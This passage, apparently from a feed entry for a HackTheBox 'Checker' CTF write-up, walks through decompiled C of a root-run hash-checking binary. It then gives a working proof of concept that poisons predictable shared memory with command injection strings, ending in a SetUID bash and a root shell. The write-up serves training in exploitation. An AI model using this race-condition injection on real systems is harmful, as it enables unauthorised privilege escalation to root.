class="p">);</span> <span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">now_stamp</span><span class="p">);</span> <span class="n">key</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span> <span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span> <span class="o">%</span> <span class="mh">0xfffff</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="mh">0x3b6</span><span class="p">);</span> </code></pre></div></div> <p>It gets a handle to that space:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">h_shm</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> </code></pre></div></div> <p>And later writes a message into the memory and detaches:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">snprintf</span><span class="p">(</span><span class="n">h_shm</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="s">"Leaked hash detected at %s &gt; %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">timestamp</span><span class="p">,</span><span class="n">hash</span><span class="p">);</span> <span class="n">shmdt</span><span class="p">(</span><span class="n">h_shm</span><span class="p">);</span> </code></pre></div></div> <h4 id="notify_user">notify_user</h4> <p><code class="language-plaintext highlighter-rouge">notify_user</code> takes the key and uses it with <code class="language-plaintext highlighter-rouge">shmget</code> and then <code class="language-plaintext highlighter-rouge">shmat</code> to get access to the same shared memory space.</p> <p>It first finds the string “Leaked hash detected” and then the “&gt;” character:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">str</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">h_shm</span><span class="p">,</span><span class="s">"Leaked hash detected"</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="n">str</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"No hash detected in shared memory."</span><span class="p">);</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">str</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="sc">L'&gt;'</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="n">str</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Malformed data in the shared memory."</span><span class="p">);</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> </code></pre></div></div> <p>Then it calls <code class="language-plaintext highlighter-rouge">trim_bcrypt_hash</code>, which returns just the hash after the “&gt;”. It creates memory to hold a <code class="language-plaintext highlighter-rouge">mysql</code> command, and then writes that command to it:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">str</span> <span class="o">=</span> <span class="n">trim_bcrypt_hash</span><span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> <span class="n">resp</span> <span class="o">=</span> <span class="n">setenv</span><span class="p">(</span><span class="s">"MYSQL_PWD"</span><span class="p">,</span><span class="n">DB_PASS</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="n">resp</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">resp</span> <span class="o">=</span> <span class="n">snprintf</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s">"mysql -u %s -D %s -s -N -e </span><span class="se">\'</span><span class="s">select email from teampass_users where pw = </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"\'</span><span class="s">"</span> <span class="p">,</span><span class="n">DB_USER</span><span class="p">,</span><span class="n">DB_NAME</span><span class="p">,</span><span class="n">str</span><span class="p">);</span> <span class="n">cmd_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="n">resp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span> <span class="k">if</span> <span class="p">(</span><span class="n">cmd_buffer</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Failed to allocate memory for command"</span><span class="p">);</span> <span class="n">shmdt</span><span class="p">(</span><span class="n">h_shm</span><span class="p">);</span> <span class="n">bVar4</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">snprintf</span><span class="p">(</span><span class="n">cmd_buffer</span><span class="p">,(</span><span class="kt">long</span><span class="p">)(</span><span class="n">resp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="s">"mysql -u %s -D %s -s -N -e </span><span class="se">\'</span><span class="s">select email from teampass_users where pw = </span><span class="se">\"</span><span class="s">% s</span><span class="se">\"\'</span><span class="s">"</span> <span class="p">,</span><span class="n">DB_USER</span><span class="p">,</span><span class="n">DB_NAME</span><span class="p">,</span><span class="n">str</span><span class="p">);</span> <span class="n">__stream</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">cmd_buffer</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span> </code></pre></div></div> <p>Then it runs the command with <code class="language-plaintext highlighter-rouge">popen</code>.</p> <h3 id="exploit">Exploit</h3> <h4 id="strategy">Strategy</h4> <p>The program writes a string to a shared memory buffer, sleeps for one second, and then uses that buffer to craft a command sent to <code class="language-plaintext highlighter-rouge">popen</code>. If I can change that memory, I can command inject to run arbitrary commands as root.</p> <p>I’ll note that when the shared memory is requested, it uses the flags 0x3b6, which is 0o1666:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">oct</span><span class="p">(</span><span class="mh">0x3b6</span><span class="p">)</span> <span class="go">'0o1666' </span></code></pre></div></div> <p>That’s writable by any user.</p> <h4 id="poc">POC</h4> <p>I’ll write a program in C that will seed the random number generator the same way that <code class="language-plaintext highlighter-rouge">check_leak</code> does, and generate the same random number, and write a command injection payload into the file.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"> #include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"> #include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"> #include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="cp"> </span> <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span> <span class="kt">time_t</span> <span class="n">now</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span> <span class="n">srand</span><span class="p">(</span><span class="n">now</span><span class="p">);</span> <span class="kt">int</span> <span class="n">key</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xfffff</span><span class="p">;</span> <span class="kt">int</span> <span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="mh">0x3b6</span><span class="p">);</span> <span class="kt">char</span> <span class="o">*</span><span class="n">h_shm</span> <span class="o">=</span> <span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="n">snprintf</span><span class="p">(</span><span class="n">h_shm</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s">"Leaked hash detected at whenever &gt; '; touch /tmp/0xdf;#"</span><span class="p">);</span> <span class="n">shmdt</span><span class="p">(</span><span class="n">h_shm</span><span class="p">);</span> <span class="p">}</span> </code></pre></div></div> <p>This program will seed the random number generator and get a random five digit key, just like the program data. It will then open shared memory with that key and attach. I didn’t include the error handling as I’m just hacking here.</p> <p>It then writes my malicious string into shared memory, so that when it’s read, it runs the SQL query, exits, and runs my command.</p> <p>I’ll upload this to Checker, compile it, and then run it in a loop, poisoning continuously the shared memory for the random number of the current timestamp:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:/tmp$</span><span class="w"> </span>nano d.c <span class="gp">reader@checker:/tmp$</span><span class="w"> </span>gcc d.c <span class="nt">-o</span> d <span class="gp">reader@checker:/tmp$</span><span class="w"> </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do</span> ./d <span class="p">;</span> <span class="k">done</span> </code></pre></div></div> <p>In a second SSH terminal, I’ll run the command to check bob, which has a leaked hash.</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">sudo</span> /opt/hash-checker/check-leak.sh bob <span class="go">Password is leaked! Using the shared memory 0x6ADF0 as temp location ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1 Failed to read result from the db </span></code></pre></div></div> <p>There’s an SQL error, which is due to my injection! More interestingly, there’s now a <code class="language-plaintext highlighter-rouge">/tmp/0xdf</code> file owned by root:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf <span class="go">-rw-r--r-- 1 root root 0 Feb 24 19:32 /tmp/0xdf </span></code></pre></div></div> <h4 id="shell-1">Shell</h4> <p>I’ll update my code with a new payload to make a SetUID/SetGID <code class="language-plaintext highlighter-rouge">bash</code>:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">snprintf</span><span class="p">(</span><span class="n">h_shm</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s">"Leaked hash detected at whenever &gt; '; cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf;#"</span><span class="p">);</span> </code></pre></div></div> <p>On running again, it works:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf <span class="go">-rwsrwsrwx 1 root root 1396520 Feb 24 19:34 /tmp/0xdf </span></code></pre></div></div> <p>Running it with <code class="language-plaintext highlighter-rouge">-p</code> returns a root shell:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">reader@checker:~$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span> <span class="gp">0xdf-5.1#</span><span class="w"> </span></code></pre></div></div> <p>And the root flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.1# </span><span class="nb">cat </span>root.txt <span class="go">2226b8ab************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-checker"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="htb-checker"/>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="nmap"/>
<category term="ubuntu"/>
<category term="bookstack"/>
<category term="laravel"/>
<category term="teampass"/>
<category term="cve-2023-1545"/>
<category term="sqli"/>
<category term="hashcat"/>
<category term="2fa"/>
<category term="cve-2023-6199"/>
<category term="ssrf"/>
<category term="burp-repeater"/>
<category term="burp"/>
<category term="filter-chains-oracle"/>
<category term="oathtool"/>
<category term="htb-trickster"/>
<category term="htb-linkvortex"/>
<category term="race-condition"/>
<category term="shared-memory"/>
<summary type="html">
<![CDATA[ Checker starts with instances of BookStack and Teampass. Without creds to either, I’ll find an SQL injection vulnerability in Teampass and leak user hashes. One cracks, and let’s me in, revealing both BookStack and SSH creds. SSH has two factor enabled. In BookStack, I’ll exploit an SSRF with a very tricky blind PHP filter oracle to read the two factor seed from a backup, and get a shell on the box. For root, I’ll exploit a binary that uses shared memory to look for compromised hashes, and poison that memory in a race condition to get execution as root. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/checker-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/checker-cover.png"/>
</entry>
</feed>